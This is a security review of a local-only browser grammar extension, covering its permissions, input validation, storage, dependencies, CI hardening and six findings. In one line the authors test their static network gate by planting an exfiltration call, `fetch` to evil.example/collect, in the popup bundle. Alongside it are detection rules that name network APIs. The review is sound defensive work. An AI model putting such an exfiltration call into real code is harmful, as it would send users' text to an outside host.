# Security review — Milestone 7

Date: 2026-10-10. Scope: the extension as built from this branch (popup, service worker, injected page script, grammar worker), its build and release pipeline, and its dependencies. The threat model and standing rules are in [security.md](security.md); this records what was checked, how, and what was found.

## Summary

| Area                  | Result                                                                                    |
| --------------------- | ----------------------------------------------------------------------------------------- |
| Permissions           | Minimal: `activeTab`, `contextMenus`, `scripting`. No host permissions. No change needed. |
| Local-only processing | Confirmed at runtime and now also statically, in the build gate.                          |
| Untrusted input       | Every boundary validated. One gap found and fixed: unbounded selection size (F-1).        |
| Rendering             | No HTML rendering of any text.                                                            |
| Storage               | Nothing stored.                                                                           |
| Messaging             | No message listeners at all: nothing another extension or page can call.                  |
| Dependencies          | 5 runtime packages, all MIT/Apache-2.0. No high/critical advisories. Signatures verified. |
| Pipeline              | Least privilege; no secrets; pinned actions. Hardened further (F-3).                      |

## Checks performed

### 1. Permissions and manifest

Built `dist/manifest.json` contains only: `manifest_version, name, version, description, minimum_chrome_version, permissions, commands, action, icons, background, content_security_policy`.

- No `host_permissions`, `content_scripts`, `web_accessible_resources` or `externally_connectable`. Pages cannot load extension resources; other extensions get nothing to talk to.
- CSP: `script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; frame-ancestors 'none'`.
- Enforced by `validate:build`, which fails on any other permission, any host permission, or a weaker CSP.

### 2. Local-only processing

- **Runtime:** WB-SEC-018 records every request made while checking text; all are to the extension's own files.
- **Static (new):** `validate:build` now fails if shipped code contains any URL outside a reviewed allow-list (XML namespaces, React's error-message links, a Tailwind credit comment, none of which is ever requested), or uses `fetch` anywhere except the grammar worker (which loads its own WebAssembly), or uses XMLHttpRequest, WebSocket, EventSource or sendBeacon at all. Tested by planting `fetch("https://evil.example/collect", …)` in the popup bundle: the build failed on both rules.
- The popup bundle used to contain one `fetch`: Vite's module-preload polyfill, which fetches the extension's own scripts in browsers without native support. Chrome 116+ has native support, so the polyfill is now disabled (F-2).

### 3. Untrusted input

| Boundary                          | Validation                                                                               |
| --------------------------------- | ---------------------------------------------------------------------------------------- |
| Page → popup (captured selection) | `parseCaptureResult`: exact shape, known statuses, offsets consistent with text          |
| Page → popup (replace result)     | `parseReplaceResult`: known statuses only, counts checked                                |
| Popup → worker, worker → popup    | `parseRequest` / `parseResponse`, including a size bound and issue offsets               |
| URL `?tab=`                       | Digits only; grants nothing without the user's `activeTab` grant                         |
| Page DOM at replace time          | Exact expected text at exact offsets; editor's whole text verified after every rich edit |

Searches of `src/`: no `eval`, `new Function`, `innerHTML`, `outerHTML`, `insertAdjacentHTML` or `dangerouslySetInnerHTML`. All user and page text is rendered as React text nodes.

### 4. Storage and logging

- No use of `chrome.storage`, `localStorage`, `sessionStorage`, IndexedDB or cookies. Text lives only in the popup's memory and is gone when it closes.
- Two log calls in the whole codebase, both in the service worker, both logging a Chrome error message, never user text. `console.log` is banned by lint.

### 5. Injected code

`runInPage` runs in Chrome's isolated world: the page's own scripts cannot read its variables, replace `document.execCommand` for it, or see the private MessageChannel it uses to yield. A hostile page _can_ control the DOM it reads, which is why its answers are validated, and it can observe edits to its own fields, which is inherent and harmless.

### 6. Dependencies

- Runtime (shipped): `harper.js` 2.10.0 (Apache-2.0) with `fflate` 0.8.3 (MIT); `react`, `react-dom` 19.3.0 and `scheduler` 0.28.0 (MIT). Licence texts ship in `THIRD_PARTY_NOTICES.txt`.
- `npm audit`: no high or critical advisories. One low advisory in `quill` (dev-only test page library; not shipped; the affected HTML export isn't used).
- `npm audit signatures`: all 128 installed packages have verified registry attestations. Now a CI step.

### 7. Pipeline

- Workflows have `contents: read`; only the release job can write, and only to create the release. No secrets are used anywhere, so pull-request code can't reach credentials; `pull_request_target` is not used.
- Every third-party action is pinned to a commit SHA. Checkouts now use `persist-credentials: false`, so the token is not left on disk for later steps (F-3).
- Dependabot opens weekly update PRs (grouped for tooling) that go through CI like any change. Harper's minor/major updates are excluded, because they change grammar output and need a deliberate fixture update.

## Findings

| ID  | Finding                                                                                                                                                                                                                                                          | Severity | Status                                                                                                        |
| --- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ------------------------------------------------------------------------------------------------------------- |
| F-1 | **Unbounded selection size.** The page script returned the whole selection however large; the popup only applied its 5,000-character limit afterwards. Measured: counting a 5 MB text costs ~0.5 s per keystroke, and the whole text crossed into the extension. | Medium   | **Fixed.** Selections over 40,000 UTF-16 units are refused before their text is read. WB-SEC-028, WB-SEC-029. |
| F-2 | Vite's module-preload polyfill put an unnecessary `fetch` in the popup bundle.                                                                                                                                                                                   | Low      | **Fixed.** Polyfill disabled; static network gate added.                                                      |
| F-3 | CI checkouts left the GitHub token in `.git/config` for later steps.                                                                                                                                                                                             | Low      | **Fixed.** `persist-credentials: false` on every checkout.                                                    |
| F-4 | `npm sbom` omitted React from a production SBOM, so a published SBOM would have been incomplete.                                                                                                                                                                 | Low      | **Fixed.** SBOM generated from the same dependency walk as the licence notices.                               |
| F-5 | The right-click entry also appears on password fields (Chrome's `editable` context can't exclude them). Choosing it opens the popup, which refuses to read the field.                                                                                            | Info     | Accepted. No data exposure; documented.                                                                       |
| F-6 | `activeTab` access persists across same-origin navigation until the tab leaves the site.                                                                                                                                                                         | Info     | Accepted. Chrome behaviour; WriteBetter only reads when its popup opens. Documented in privacy.md.            |

## Not covered

- A penetration test by a third party.
- Manual review of every line of the five runtime dependencies. They were checked for network use and pinned to exact versions.
- Behaviour on specific real sites, which remains a manual check (test-cases.md).
